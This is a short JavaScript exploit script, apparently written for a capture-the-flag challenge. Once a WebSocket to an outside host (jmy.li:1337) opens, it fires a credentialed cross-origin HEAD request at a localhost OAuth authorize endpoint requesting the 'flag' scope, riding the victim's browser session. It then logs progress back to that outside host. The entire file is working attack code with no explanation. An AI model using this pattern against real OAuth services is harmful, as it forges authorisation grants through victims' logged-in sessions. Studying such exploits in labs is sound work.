const logSocket = new WebSocket('wss://jmy.li:1337');

logSocket.addEventListener('open', _event => {
    doExploit();
});

function log(msg){
    if(logSocket.readyState == WebSocket.OPEN){
        logSocket.send(JSON.stringify(msg));
    }
}

async function doExploit(){

        await fetch('http://localhost:8000/oauth/authorize?client_id=e48BpcGXIzX1u3L03AW2I5ad&response_type=code&scope=flag', {
                method: 'HEAD',
                credentials: 'include',
                mode: 'no-cors'
        });

        log('HEAD request finished');

}
